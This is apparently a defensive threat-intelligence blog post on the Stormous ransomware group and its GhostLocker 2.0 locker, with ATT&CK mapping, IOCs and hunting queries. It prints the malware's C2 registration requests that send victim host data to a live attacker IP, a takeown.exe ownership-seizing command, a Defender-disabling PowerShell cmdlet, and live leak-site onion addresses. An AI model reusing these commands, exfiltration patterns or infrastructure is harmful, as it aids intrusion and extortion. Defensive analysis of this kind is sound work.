---
title: "Stormous Ransomware: A Complete Deep-Dive — Origins, Alliances, GhostLocker 2.0 Binary Analysis, and Full MITRE ATT&CK Mapping"
date: 2026-06-30 14:00:00 +0100
categories: [Threat Intelligence, Ransomware]
tags: [stormous, ghostlocker, raas, mitre-attack, ioc, cti, dark-web, byovd, golang, hacktivism, five-families]
image:
  path: /assets/img/stormous-logo.png
  alt: Stormous ransomware threat intelligence banner
pin: false
toc: true
comments: true
---

> **TLP:AMBER** — This analysis is prepared for the defensive benefit of the security community. All data is sourced from open-source intelligence: dark-web monitoring, public threat-intelligence trackers (Ransomware.live, RansomLook, ransomwatch, deepdarkCTI), and published vendor research (Xcitium ThreatLabs, SOCRadar, Group-IB, KELA Cyber, SalvageData, Red Piranha, Cyberplan, TheSECMaster). No offensive use is condoned.
{: .prompt-warning }

---

## TL;DR

Stormous is one of the most strategically interesting ransomware groups currently operating — not because they're technically the most sophisticated, but because of how they blend **pro-Russian political hacktivism with a mature, evolving RaaS business model**, how aggressively they've built alliances (GhostSec, the Five Families collective), and how fast they've recovered from multiple periods of apparent inactivity to come back stronger each time. As of June 30, 2026 they're sitting at **198 live entries on their Tor leak site** and ranked the **#1 most active ransomware group globally this week** by RansomLook (+750% week-over-week). This post covers everything: who they are, how they operate at the binary level, where their infrastructure lives, and how to detect and defend against them.

---

## 1. Origins and Political Identity

### 1.1 Emergence (2021)

Stormous first appeared in the cybercrime underground around **mid-2021**, initially operating through Telegram channels and making claims that, at the time, most researchers treated with significant skepticism. KELA Cyber's review of data allegedly stolen in the group's early operations found that some of the "leaked" material was either fabricated or already publicly available on dark-web forums from prior breaches by other groups. The term **"scavenger operations"** entered the CTI vocabulary specifically in the context of Stormous: targeting companies whose data had already been compromised by someone else, then re-extorting them or claiming the breach as their own work.

Whether the early operations were genuine or performative, they served a purpose: **building notoriety in a mediatized conflict at exactly the right moment**.

### 1.2 The Russia Declaration (February 2022)

When Russia invaded Ukraine in February 2022, Stormous seized the moment. They published a bilingual (Arabic/English) statement officially declaring support for the Russian government and explicitly warning that any party organizing cyberattacks against Russia would face retaliation against Western infrastructure:

![Stormous official pro-Russia statement](/assets/img/stormous-political-statement.png)
_Stormous's original declaration, published February 2022. The group cites a prior intrusion against the Ukraine Ministry of Foreign Affairs and a Ukrainian airline as evidence of capability._

The statement is worth reading carefully for what it reveals about the group's self-perception and communication strategy. The framing is explicitly **geopolitical**: it positions the group not as criminals but as ideological actors defending Russian interests. It also references prior "operations" against Ukrainian targets as proof of capability — operationalizing those (contested) early breaches retroactively as political acts.

SOCRadar analysts assessed at the time that the Russia alignment may reflect genuine political views of group members, but also noted the **strategic advantage of aligning with a highly mediatized conflict** to attract followers and attention — a pattern common across both hacktivist and criminal-adjacent groups.

### 1.3 High-Profile Early Claims

In the months following the declaration, Stormous claimed data breaches affecting:
- **Coca-Cola** — 161 GB allegedly stolen
- **Mattel** — claimed breach
- **Danaher** — claimed breach
- **Ukraine Ministry of Foreign Affairs** — claimed network intrusion
- **Epic Games** — 200 GB allegedly exfiltrated (announced via Telegram)

Independent verification of most of these claims was limited or negative. Researchers (ZeroFox, SOCRadar) flagged the possibility of scavenger operations. It's important to note that **unverified historical claims do not mean current operations are fabricated** — the group's technical capability has evolved substantially since 2022, as the GhostLocker 2.0 binary analysis in Section 5 demonstrates.

---

## 2. Group Structure and Evolution

### 2.1 From Telegram Gang to RaaS Operation

The 2021–2022 Stormous was essentially a Telegram-coordinated hacktivist crew with basic ransomware capability and an oversized social media presence. By 2023–2024, that had changed materially:

- **July 2023**: The group relaunched their previously inaccessible Tor leak site with significant upgrades — a victim listing page, a **"Shop" section** (offering data from specific victims for direct sale, not just ransom), and critically, a **"Job Application" page** actively recruiting individuals with skills in ransomware development, phishing, and social engineering. This is the transition from a crew to an **organized criminal operation with a defined employment pipeline**.
- **Late 2023**: Collaboration with GhostSec produced joint campaigns against multiple targets, including three Cuban government ministries and a simultaneous four-victim wave spanning Serbia, Egypt, Vietnam, and Morocco.
- **March 2024**: Formal launch of **STMX_GhostLocker**, a Ransomware-as-a-Service platform jointly operated with GhostSec.
- **Mid-to-late 2024**: GhostSec publicly announced retirement from ransomware operations and handed the **full GhostLocker codebase (v3) and the entire RaaS operation to Stormous**. Stormous now owns the complete toolchain.

### 2.2 The Five Families Collective

Stormous is one-fifth of a loose hacktivist-criminal collective calling themselves **"The Five Families"**, which also includes GhostSec, ThreatSec, Blackforums, and SiegedSec. The collective coordinates joint campaigns, shares target intelligence, and provides each member group with a broader distribution network for claims and data leaks.

![Stormous group affiliations and collective structure](/assets/img/diagram_affiliations.png)
_Network diagram showing Stormous's known alliances, partnerships, and overlap with other threat actors._

### 2.3 Data-Reuse and Cross-Claim Patterns

Independent research (Analyst1) has documented Stormous, alongside the Snatch group, engaging in **hybrid ransomware-plus-influence-operation tactics** that include cross-claiming or reusing datasets originally stolen by other groups (notably RansomHouse and Dark Angels/Dunghill Leak). This has two practical implications for CTI analysts:

1. **Attribution confidence must be qualified**: a Stormous leak-site posting is a strong signal worth investigating immediately, but should not be treated as a confirmed, independently-sourced breach until corroborated.
2. **The same victim dataset may appear under multiple group names** — watch for this when cross-referencing across aggregators.

---

## 3. Operational Timeline

![Stormous operational timeline 2021–2026](/assets/img/diagram_timeline.png)
_Key events, campaigns, pivots, and capability developments from emergence to the June 2026 activity surge._

The timeline reveals a consistent pattern: **periods of quiet followed by aggressive resurgence**, each time with a more mature technical toolkit and a broader network of alliances. The June 2026 surge — 17 new postings in 7 days, +750% week-over-week — is the most intense activity spike in the group's recorded history.

---

## 4. Attack Chain and TTPs

![Stormous 8-stage attack chain](/assets/img/diagram_attack_chain.png)
_Full eight-stage kill chain, from initial access to double-extortion publication._

### 4.1 Initial Access

Stormous affiliates use multiple converging access vectors rather than a single flagship CVE — this is a critical distinction from groups like The Gentlemen (CVE-2024-55591/FortiOS) or Akira (SimpleHelp CVEs). Access is primarily **credential- and trust-based**, which means patch-cycle discipline alone is insufficient as a defense:

**RDP/VPN brute-force and credential stuffing** is the dominant documented vector. Exposed remote-access portals with weak or reused credentials are the primary target. This has been consistent across all reporting periods.

**Phishing with politically-themed lures** — notably, Stormous affiliates have been documented using emails impersonating organizations that claim to help victims of the war in Ukraine. This exploits the heightened awareness and humanitarian response associated with the conflict to drive clicks on malicious attachments or links. The political framing is thematically consistent with the group's public identity.

**Malvertising and malicious pop-ups** serve as a secondary infection vector, particularly for lower-value or less-targeted campaigns.

**Exploitation of unpatched internet-facing applications**, VPNs, and web servers — generic, opportunistic, and not tied to a specific CVE. Affiliate-driven RaaS operations tend to adopt whichever vulnerability is currently being mass-exploited in the wider ransomware ecosystem at the time of an engagement.

**Trusted-relationship and API abuse**: the clearest documented example is the **HyperGuest hotel-booking API breach**, where an affiliate gained access to multiple hospitality-sector clients by compromising a shared SaaS integration partner rather than attacking each victim directly. This vector is underweighted in most defensive strategies but has outsized potential impact.

### 4.2 Execution

Once initial access is established, affiliates deliver the payload through a layered execution chain designed to minimize detection before the ransomware itself runs:

- **SmokeLoader** and **RedLine Stealer** are the documented primary loaders — commodity malware that downloads and executes the GhostLocker/StormCry payload while handling initial evasion
- **regsvr32.exe** is abused as a Living-Off-the-Land Binary (LOLBin) to proxy execution of malicious code through a signed, trusted Windows process
- Payloads are obfuscated via **Base64 encoding** and packing to defeat static AV signatures
- **Cobalt Strike** or similar post-exploitation frameworks are used by some affiliates for extended access and beacon-based command-and-control before the ransomware stage

### 4.3 Persistence

Multiple persistence mechanisms are layered to ensure survival across reboots and incident response attempts:

- **Scheduled Tasks** ensure payload re-execution on reboot and at defined intervals
- **Registry Run keys** (`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`) embed execution commands at startup
- **GhostLocker 2.0 specifically** self-copies into the Windows Startup folder using a randomized filename that changes per execution, defeating signature-based detection of the persistence artifact

### 4.4 Privilege Escalation

- **Token impersonation** using stolen administrative credentials elevates the process to SYSTEM-level without requiring a separate kernel exploit
- **`takeown.exe`** — a native Windows command-line utility normally used for file ownership management — is invoked to seize ownership of encrypted target files, notably without triggering a standard UAC consent prompt
- **BYOVD (Bring-Your-Own-Vulnerable-Driver)** driver abuse in some campaigns to escape sandboxing and gain kernel-level privileges
- **Mimikatz** deployed for in-memory credential extraction; **NTDS.dit** (Active Directory database) extraction for bulk enterprise credential harvesting

### 4.5 Defense Evasion

- Windows Defender disabled via PowerShell cmdlets (`Set-MpPreference -DisableRealtimeMonitoring $true`) and registry modifications
- EDR agents and security services terminated via builder-configured service-kill lists before encryption begins
- Event log clearing in some variants to eliminate forensic evidence

### 4.6 Lateral Movement

- **PsExec** pushes the ransomware executable across SMB shares to remote hosts
- **SMB admin shares** (C$, ADMIN$) used for file copy and remote service installation
- AD credential material (NTLM hashes, Kerberos tickets via NTDS.dit) enables pass-the-hash and pass-the-ticket attacks across domain-joined systems

### 4.7 Collection and Exfiltration

- **File-share harvesting** targets network shares, mapped drives, and cloud-sync folders (OneDrive, SharePoint) for financial, HR, operational, and technical documentation
- **WinRAR / 7-Zip** compress and stage collected data before exfiltration
- Data is exfiltrated to **MEGA.nz** (the group's preferred and live-confirmed staging platform), FTP servers, or PHP-based C2 panels
- **PHP-based C2 panels** serve dual purpose: command-and-control for affiliates and exfiltration receiving infrastructure

### 4.8 Encryption and Impact

Two distinct encryption implementations are active across Stormous's operational history:

**StormCry / GhostLocker v1 (Python, Nuitka-compiled)**:
Encrypted files with the **Fernet symmetric scheme** — a high-level Python cryptography library that wraps **AES-128-CBC** with a fresh random IV per file plus an **HMAC-SHA256 integrity signature**. The encryption key is a 32-byte value generated via `os.urandom()` / `CryptGenRandom`. Some ransom note variants also claim an **RSA-2048 key-wrap layer** over the Fernet key, consistent with a standard hybrid AES+RSA envelope scheme. The Nuitka compilation produces a standalone Windows executable that embeds the Python runtime, complicating dynamic analysis.

**GhostLocker 2.0 (Go/Golang — current generation)**:
**AES-256** encryption with write-encrypted-copy-then-delete-original semantics. Files receive the **`.ghost` extension**. See Section 5 for a full binary-level walkthrough.

Post-encryption, the group kills backup agents, VSS (Volume Shadow Copy Service), and database services to eliminate recovery options. The ransom note — `Ransomnote.html` for GhostLocker 2.0, `README.txt` or `README.html` for StormCry variants — is auto-launched, displaying the 32-byte victim ID.

---

## 5. GhostLocker 2.0 — Binary Analysis

![GhostLocker 2.0 binary execution and C2 architecture](/assets/img/diagram_ghostlocker_binary.png)
_Confirmed binary-level execution flow and C2 infrastructure, sourced from Xcitium ThreatLabs analysis._

### 5.1 Language and Compilation

GhostLocker 2.0 is written in **Go (Golang)**, compiled to a standalone 64-bit Windows PE executable. The Go runtime is statically linked into the binary, making it self-sufficient and significantly complicating analysis tooling calibrated for C/C++ binaries. Go's goroutine-based concurrency allows the locker to parallelize file enumeration and encryption across multiple threads, speeding up the encryption phase.

### 5.2 Anti-Analysis Measures

The builder requires a **mandatory command-line password argument** to execute. Without the correct password (typically 8 characters, matching the regex `\w{8}`), the binary exits immediately. This serves two purposes: it prevents automated sandbox detonation (sandboxes typically don't know the password), and it prevents unauthorized use of a leaked binary by anyone who isn't the intended affiliate operator.

### 5.3 Persistence Mechanism

On first execution, GhostLocker 2.0 generates a randomized filename for itself and copies the binary to the Windows Startup folder:
```
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\[random].exe
```
It simultaneously writes a corresponding **Registry Run key** at `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`. This dual-persistence ensures the payload survives both system reboots and attempts to remove only one persistence mechanism.

### 5.4 Drive Enumeration Logic

The binary enumerates all available drives and recursively walks directory trees, applying a **target filter** that skips:
- Windows system directories (`C:\Windows`, `C:\Program Files`, etc.)
- Files already carrying the `.ghost` extension (prevents double-encryption crashes)
- Specific directories required for system stability (ensuring the machine remains operable enough to display the ransom note and allow victim communication)

### 5.5 Victim Registration (C2 Protocol)

Before encryption begins, the binary registers the infection with the operator's C2 infrastructure via **two distinct HTTP endpoints** over plain (unencrypted) HTTP:

```http
POST /incrementLaunch HTTP/1.1
Host: 94.103.91[.]246
Content-Type: application/json
→ Notifies the C2 of a new execution event

POST /addInfection HTTP/1.1
Host: 94.103.91[.]246
Content-Type: application/json
Body: { "victim_id": "[32-byte-hex]", "hostname": "...", "os": "...", 
        "domain": "...", "ip": "...", "username": "...", "drives": [...] }
→ Registers full system metadata for operator tracking
```

The use of **plain HTTP (no TLS)** is a notable OPSEC weakness — this traffic is interceptable and detectable by network security monitoring without requiring certificate inspection. The 32-byte victim ID generated client-side is embedded in both the C2 registration payload and the ransom note, creating a unique linkage between the registered infection and the extortion communication.

**Confirmed C2 infrastructure**:
```
94.103.91[.]246   — STMX_GhostLocker panel (port 80)
41.216.183[.]31   — Variant 1 C2 (port 80)
SHA-256: a1b468e9550f9960c5e60f7c52ca3c058de19d42eafa760b9d5282eb24b7c55
```

### 5.6 Privilege Escalation: takeown.exe Abuse

If the payload lacks administrative rights over target files, it shells out to the native Windows utility **`takeown.exe`**:
```
takeown.exe /F "C:\path\to\file" /A
```
This command transfers file ownership to the Administrators group without triggering a UAC elevation prompt — the utility is signed, trusted, and runs at the current process's privilege level. This is a subtle technique: it doesn't require a kernel exploit or UAC bypass, it simply reassigns ownership via a legitimate OS function that most EDR rules don't alert on in isolation.

### 5.7 Defense Impairment

Before the encryption loop begins, the binary terminates a builder-configured list of processes and services. Across documented samples this includes:
- Backup agents (Veeam, Windows Backup)
- Database services (MSSQL, MySQL, PostgreSQL, MongoDB)
- Security and EDR services (varies per builder configuration — the "tailored per affiliate" aspect)
- Volume Shadow Copy Service (prevents `vssadmin delete shadows` need — services are killed, then VSS copy creation is blocked)

### 5.8 Encryption Loop

The core encryption loop operates as follows for each targeted file:
1. Read file contents into memory
2. Generate a per-file AES-256 key material (derived from a master key negotiated with the C2 or embedded in the binary per builder configuration)
3. Encrypt the contents using AES-256
4. Write the encrypted ciphertext to `[originalname].ghost`
5. Delete the original unencrypted file
6. Continue to next file

The write-then-delete semantics mean that forensic file-carving on unallocated disk space may recover partial plaintext of recently written files, depending on how quickly the delete operation is followed by new writes.

---

## 6. Dark Web Infrastructure

### 6.1 Active Leak Site — Live Verified

The primary leak site, **"Stormous.Leak"**, is confirmed active and was directly accessed on June 30, 2026:

```
http://pdcizqzjitsgfcgqeyhuee5u6uki6zy5slzioinlhx6xjnsw25irdgqd.onion/
```
**198 total entries** at time of capture. The site features:
- Searchable victim database with status badges: `New` / `Pending` / `Leaked`
- Live countdown timer on `Pending` listings (extortion deadline before publication)
- Direct MEGA.nz download button per victim (data hosted externally on the legitimate platform)
- Navigation sections: `Contact`, `Feedback`, `GhostLocker/Stm` (confirming active GhostLocker affiliation)

![Stormous.Leak live screenshot](/assets/img/stormous-leaksite-screenshot.png)
_Direct analyst capture of the live Stormous.Leak site, June 30, 2026 — 198 entries, with active New and Pending listings visible._

### 6.2 Additional Onion Infrastructure

| Address | Purpose | Status |
|---|---|---|
| `pdcizqzjitsgfcgqeyhuee5u6uki6zy5slzioinlhx6xjnsw25irdgqd.onion` | Stormous.Leak — primary active DLS | **ONLINE (confirmed June 30 2026)** |
| `ransekgbpijp56bflufgxptwn5hej2rztx423v6sim2zrzz7xetnr2qd.onion` | StormouS.X V.4 (prior generation) | Superseded |
| `h3reihqb2y7woqdary2g3bmk3apgtxuyhx4j2ftovbhe3l5svev7bdyd.onion` | RANSTREET (early portal) | Offline |
| `stmxylixiz4atpmkspvhkym4xccjvpcv3v67uh3dze7xwwhtnz4faxid.onion` | STMX_GhostLocker RaaS portal | Status variable — monitor |

> Clearnet aggregators (Ransomware.live, RansomLook.io) re-index Stormous mirrors continuously and are the recommended primary monitoring channel — they are faster and safer than direct onion access for routine tracking.
{: .prompt-tip }

### 6.3 Data Hosting Model

Unlike some groups that self-host stolen data on their own infrastructure, Stormous routes all victim data through **MEGA.nz** — a legitimate, globally accessible cloud storage platform. This is operationally clever:
- Eliminates the cost and risk of maintaining high-bandwidth download infrastructure
- Makes takedown of the data dependent on MEGA's abuse response team rather than law enforcement seizing attacker-controlled servers
- Provides victims and journalists with a familiar, accessible download mechanism that increases the probability of data exposure being noticed and publicized

### 6.4 Contact and Negotiation Channel

Primary and preferred victim contact: **TOX Messenger** (group-stated "fastest response"):
```
0E67D9C77F417ABA9564B97C616A6ADAEDC2D3B2CD32B4868FD65E661F6C79311F5C9D908716
```
Secondary: `@StormousBot` on Telegram.

---

## 7. Notable Campaigns

### 7.1 Cuba Government Ministries (August 2023)

Joint operation with GhostSec targeting three Cuban government ministries:
- **Ministry of Culture of the Republic of Cuba**
- **Ministry of Energy and Mines**
- A third ministry (details limited in public reporting)

The campaign was announced on Telegram with explicit political framing linking it to the "triumph of the Cuban Revolution." This remains one of the clearest examples of the group targeting a government apparatus rather than a commercial entity.

### 7.2 Four-Victim Wave (December 2023)

A coordinated campaign claimed victims across four countries simultaneously:
- **Comtrade Group** (Serbia)
- **Zewail City of Science and Technology** (Egypt)
- **Vietnam Electricity** (Vietnam) — critical infrastructure
- **Inwi** (Morocco) — major telecoms operator

The geographic spread and sector diversity (tech/education, critical energy infrastructure, telecoms) demonstrates the affiliate-driven nature of the operation — individual affiliates chose and compromised their own targets within a coordinated disclosure window.

### 7.3 Duvel Moortgat Brewery (Belgium, 2024)

The Belgian craft brewery **Duvel Moortgat** was compromised with **88 GB of data stolen**, including sensitive company and employee personal information. Production was disrupted. This is among the clearest verified Stormous operations with independently-confirmable victim impact, cited by Cyberplan in their threat profile of the group.

### 7.4 French Government Credential Leak (May 2025)

A significant credential leak affecting multiple French government agencies, including:
- **AFD** (Agence Française de Développement — French development finance institution)
- **ARS Île-de-France** (regional health agency)
- **Cour des Comptes** (Court of Audit — France's supreme audit institution)

Approximately **70,000 MD5-hashed credentials** were published. The targeting of a financial development institution and the court of audit alongside a health agency suggests a broad-sweep approach rather than targeted sector selection.

### 7.5 HyperGuest Supply-Chain Compromise (2025)

The **HyperGuest** hotel-booking API breach is the clearest documented example of Stormous's trusted-relationship access methodology. Rather than attacking hospitality organizations directly, affiliates compromised HyperGuest — a SaaS provider offering API-based connectivity between hotels and booking platforms — and used the trusted integrations to access data across multiple hotel clients simultaneously. This is a genuinely dangerous access vector because it bypasses per-organization perimeter defenses entirely.

### 7.6 June 2026 Activity Surge

As of the date of this analysis (June 30, 2026), Stormous is in its **most active recorded period**:
- **198 entries on the live leak site**
- **17 new postings in 7 days** (+750% week-over-week per RansomLook)
- **#1 ranked ransomware group globally** by activity this week
- Recent victims include Higuchi USA / higuchi-inc.co.jp, eshacloudqa.com, eogb.co.uk (UK), and multiple others across technology, manufacturing, and e-commerce sectors

---

## 8. MITRE ATT&CK Analysis

### 8.1 Campaign / Affiliate-Level TTPs

| Tactic | ID | Technique | Evidence |
|---|---|---|---|
| Initial Access | T1110 | Brute Force | RDP/VPN credential stuffing — dominant documented vector |
| Initial Access | T1566 | Phishing | Political/humanitarian lures (fake Ukraine-aid orgs) |
| Initial Access | T1190 | Exploit Public-Facing App | Opportunistic CVE exploitation (no fixed CVE) |
| Initial Access | T1078 | Valid Accounts | Stolen/purchased credentials |
| Initial Access | T1199 | Trusted Relationship | HyperGuest API supply-chain abuse |
| Execution | T1059 | Command and Scripting Interpreter | PowerShell for AV disable, loader execution |
| Execution | T1218.010 | regsvr32 (LOLBin) | Stealthy payload execution via signed Windows binary |
| Resource Dev. | T1588.001 | Malware Loaders | SmokeLoader, RedLine Stealer for payload delivery |
| Persistence | T1053.005 | Scheduled Task/Job | Reboot persistence |
| Persistence | T1547.001 | Registry Run Keys / Startup Folder | Both mechanisms used simultaneously |
| Defense Evasion | T1027 | Obfuscated Files | Base64 encoding, packed binaries |
| Defense Evasion | T1574.002 | DLL Side-Loading | Stealthy payload execution |
| Defense Evasion | T1562.001 | Impair Defenses | Defender, EDR agents terminated pre-encryption |
| Privilege Escalation | T1134 | Access Token Manipulation | Stolen admin credential token impersonation |
| Privilege Escalation | T1548.002 | Bypass User Account Control | takeown.exe (no UAC prompt) |
| Credential Access | T1003 | OS Credential Dumping | Mimikatz — LSASS memory extraction |
| Credential Access | T1003.003 | NTDS | Active Directory NTDS.dit extraction |
| Lateral Movement | T1021.002 | SMB/Windows Admin Shares | PsExec + SMB payload distribution |
| Lateral Movement | T1569.002 | Service Execution | PsExec remote process creation |
| Collection | T1039 | Data from Network Shares | File-share harvesting |
| Collection | T1560 | Archive Collected Data | WinRAR / 7-Zip staging |
| C2 | T1071.001 | Web Protocols | PHP-based C2 panels |
| C2 | T1572 | Protocol Tunneling | Telegram bot alerting channel |
| Exfiltration | T1567.002 | Exfil to Cloud Storage | MEGA.nz data staging |
| Impact | T1486 | Data Encrypted for Impact | AES-256 (GhostLocker 2.0) / AES-128-CBC (StormCry) |
| Impact | T1490 | Inhibit System Recovery | VSS, Veeam, backup services killed |
| Impact | T1657 | Financial Theft | Double extortion ransom demands |

### 8.2 GhostLocker 2.0 Payload-Level TTPs (Binary-Confirmed)

| Tactic | ID | Technique | Specifics |
|---|---|---|---|
| Persistence | T1547.001 | Boot/Logon Autostart | Startup folder + randomized filename + Registry Run key |
| Privilege Escalation | T1548.002 | Bypass UAC | takeown.exe — no UAC prompt |
| Discovery | T1083 | File and Directory Discovery | Full drive walk, system dirs skipped |
| Defense Evasion | T1562.001 | Impair Defenses | Builder-config service/process kill list |
| C2 | T1071.001 | Application Layer Protocol (HTTP) | Plain HTTP to /incrementLaunch and /addInfection |
| Exfiltration | T1041 | Exfil Over C2 Channel | JSON victim metadata POST to /addInfection |
| Impact | T1486 | Data Encrypted for Impact | AES-256, .ghost extension, write-then-delete semantics |
| Impact | T1490 | Inhibit System Recovery | Service termination before encryption loop |

---

## 9. CVE and Vulnerability Exploitation Analysis

This is a crucial differentiator: **Stormous does not have a signature initial-access CVE**. This matters for how you defend against them.

Groups like The Gentlemen (CVE-2024-55591/FortiOS, 14,700 pre-exploited devices), Akira (SimpleHelp CVEs), or ALPHV/BlackCat (specific Exchange/VPN vulnerabilities) built their access pipelines around specific exploitable weaknesses. Patching those specific CVEs meaningfully degrades their access capability.

Stormous's access model is different. It is:
- Primarily **credential-based** (brute-force, stuffing, stolen credentials)
- Secondarily **trust-based** (compromising a supply-chain partner to access multiple clients)
- Tertiarily **opportunistic vulnerability exploitation** (whatever is being mass-exploited in the wider ecosystem at the time — affiliates bring their own exploits)

### Implications for defense

| Vector | Effective mitigation | Ineffective mitigation |
|---|---|---|
| RDP/VPN brute-force | MFA enforcement, account lockout, geofencing | Patching (no CVE to patch) |
| Credential stuffing | Credential monitoring (HaveIBeenPwned, leaked-DB alerts), MFA | Perimeter hardening alone |
| API/supply-chain trust | Vendor risk assessment, API scope review, credential rotation on vendor compromise | Internal patch schedules |
| Opportunistic CVE | Standard vulnerability management + CISA KEV catalog | Single-CVE patch campaigns |

The key takeaway: **MFA on every remote-access portal will reduce your Stormous exposure more than any patch cycle.** This is not true for all ransomware groups.

---

## 10. Indicators of Compromise

### 10.1 File Artifacts

| Type | Artifact | Notes |
|---|---|---|
| Encrypted extension | `.ghost` | GhostLocker 2.0 (current) |
| Encrypted extension | `.stormous` / `.F5` | StormCry / legacy variants |
| Ransom note | `Ransomnote.html` | GhostLocker 2.0 — auto-launched, shows victim ID |
| Ransom note | `README.txt` | StormCry plain-text |
| Ransom note | `README.html` | StormCry HTML (pulls content from Pastebin at runtime) |
| Persistence | `%APPDATA%\...\Startup\[random].exe` | GhostLocker 2.0 Startup-folder persistence |
| Tool | `takeown.exe` invocation | Native Windows binary, abused for file ownership |

### 10.2 Network IOCs

| Type | Value | Notes |
|---|---|---|
| C2 IP | `94.103.91[.]246` | GhostLocker C2 (port 80) — STMX panel |
| C2 IP | `41.216.183[.]31` | GhostLocker C2 (port 80) — Variant 1 |
| C2 endpoint | `/incrementLaunch` | HTTP POST — new execution notification |
| C2 endpoint | `/addInfection` | HTTP POST — victim metadata exfiltration |
| Contact | TOX ID (above) | Primary negotiation channel |
| Platform | `mega.nz` | Exfiltration staging and data distribution |

### 10.3 File Hash

| Type | Hash |
|---|---|
| SHA-256 | `a1b468e9550f9960c5e60f7c52ca3c058de19d42eafa760b9d5282eb24b7c55` |

### 10.4 SIEM and Endpoint Hunting Queries

```yaml
# Hunt for takeown.exe abuse preceding mass file writes
ProcessName: "takeown.exe"
CommandLine: "/F * /A"
→ correlate with: mass FileWrite events within 60 seconds on same host

# Hunt for GhostLocker 2.0 Startup-folder persistence
FilePath: "%APPDATA%\\*\\Startup\\*.exe"
FileCreatedBy: NOT (known-good process list)
FileAge: < 24 hours

# Hunt for C2 beacon (HTTP, no TLS)
NetworkConnection.DestinationIP: ["94.103.91.246", "41.216.183.31"]
NetworkConnection.Protocol: HTTP
NetworkConnection.DestinationPort: 80

# Hunt for .ghost extension mass creation
FileExtension: ".ghost"
EventType: FileCreate
Count: > 50 in 60 seconds (threshold per environment)

# Hunt for bulk service termination (z1.bat / pre-encryption pattern)
ProcessName: "net.exe" OR "sc.exe"
CommandLine: "stop *"
Count: > 20 distinct services in 120 seconds
```

---

## 11. Defensive Recommendations

### Immediate Actions (0–72 hours)

> All of these should be treated as priority-zero if your organization has not already verified them.
{: .prompt-danger }

1. **Enforce MFA on every RDP, VPN, and remote-access portal** — no exceptions. This single control degrades Stormous's primary access vector more than anything else on this list.
2. **Audit exposed RDP** — services exposed directly to the internet without VPN gateway should be considered compromised until verified otherwise.
3. **Block C2 IPs** `94.103.91[.]246` and `41.216.183[.]31` at the perimeter; create alerts for outbound HTTP to `/incrementLaunch` and `/addInfection` URI paths.
4. **Hunt for file artifacts**: `Ransomnote.html`, `README.txt/html`, `.ghost` / `.stormous` / `.F5` extensions across all endpoints.
5. **Hunt for `takeown.exe` abuse**: unexplained invocations immediately preceding mass file-write or file-delete activity are a strong GhostLocker 2.0 precursor signal.
6. **Review third-party API integrations** and rotate associated credentials; audit vendor API permission scopes.

### Short-Term Actions (1–4 weeks)

- Deploy WAF + DDoS protection on all public-facing web applications
- Restrict `takeown.exe`, PsExec, and SMB admin shares via EDR application control — or alert heavily on their use
- Monitor for Startup-folder writes of newly-created executables with randomized filenames
- Watch for bulk outbound traffic to `mega.nz` outside of known business use
- Monitor for unusual WinRAR / 7-Zip invocations compressing large directories at unusual hours
- Implement network segmentation to limit PsExec / SMB lateral movement potential

### Strategic Actions (1–3 months)

- **Immutable offline backups** — Veeam agents and VSS are explicit targets; a backup that is network-accessible is not a backup in a ransomware scenario
- **Phishing-resistance training** specifically including humanitarian and war-crisis themed lures — this is the documented Stormous phishing category
- **Vendor/supply-chain risk program** covering API integration partners — the HyperGuest model will be replicated
- **Dark web monitoring** via Ransomware.live / RansomLook for organizational mentions — aggregators are safer and faster than direct onion access
- **Incident response rehearsal** for double-extortion scenarios: the organizational, legal, and communication decisions when data is *both* encrypted *and* about to be published are different from a simple ransomware-only incident

---

## 12. Intelligence Sources and References

| # | Source | URL |
|---|---|---|
| 1 | SOCRadar — Stormous RansomwareRadar | <https://socradar.io/free-tools/ransomware-intelligence/groups/stormous> |
| 2 | SOCRadar — Dark Web Profile: Who is Stormous | <https://socradar.io/blog/who-is-stormous-ransomware-group/> |
| 3 | KELA Cyber — Stormous Extortion Group Strikes Back | <https://www.kelacyber.com/blog/stormous-extortion-group-strikes-back/> |
| 4 | TheSECMaster — Stormous Ransomware Analysis | <https://thesecmaster.com/blog/stormous-ransomware> |
| 5 | SalvageData — Stormous Complete Guide | <https://www.salvagedata.com/blog/stormous-ransomware> |
| 6 | Xcitium ThreatLabs — GhostLocker 2.0 Technical Deep Dive | <https://threatlabsnews.xcitium.com/blog/before-the-ghost-extension-appears-its-already-too-late-a-technical-deep-dive-into-stormous-ghostlocker/> |
| 7 | Daily Security Review — Security Spotlight: Stormous | <https://dailysecurityreview.com/security-spotlight/stormous-ransomware-the-pro-russian-cyber-gang-targeting-global-networks/> |
| 8 | Cyberplan.be — Hacker Group: Stormous | <https://cyberplan.be/en/articles/hacker-group-stormous-group/> |
| 9 | Seqrite — GhostLocker 2.0 Evolving Threat | <https://www.seqrite.com/blog/ghost-locker-2-0-the-evolving-threat-of-ransomware-as-a-service-unveiled-by-ghostsec/> |
| 10 | SentinelOne — GhostLocker RaaS Anthology | <https://www.sentinelone.com/anthology/ghostlocker-raas/> |
| 11 | Israel CERT (INCD) — GhostLocker Alert | <https://www.gov.il/BlobFolder/reports/alert_1749/he/ALERT-CERT-IL-W-1749.pdf> |
| 12 | Ransomware.live — Stormous Group Profile | <https://www.ransomware.live/group/stormous> |
| 13 | RansomLook — Stormous Tracker | <https://www.ransomlook.io/group/stormous> |
| 14 | ransomwatch (GitHub) — Onion Mirror Index | <https://github.com/joshhighet/ransomwatch> |
| 15 | deepdarkCTI (GitHub) — Ransomware Gang Tracker | <https://github.com/fastfire/deepdarkCTI> |
| 16 | Analyst1 — RansomHouse Influence Operations | <https://analyst1.com/ransomhouse-stolen-data-market-influence-operations-amp-other-tricks-up-the-sleeve/> |
| 17 | Red Piranha — Threat Intel Report May 2025 | <https://redpiranha.net/news/threat-intelligence-report-may-20-may-26-2025> |
| 18 | Secure Blink — Stormous Four-Victim Campaign | <https://www.secureblink.com/threat-feeds/stormous-ransomware-targeted-four-victims-in-a-new-campaign> |

---

*Last updated: June 30, 2026. IOCs and infrastructure details should be reverified against live threat intelligence feeds before operational use — C2 IPs and onion addresses rotate. If you have additional confirmed TTPs or victim data to share, contact via the blog's contact page.*
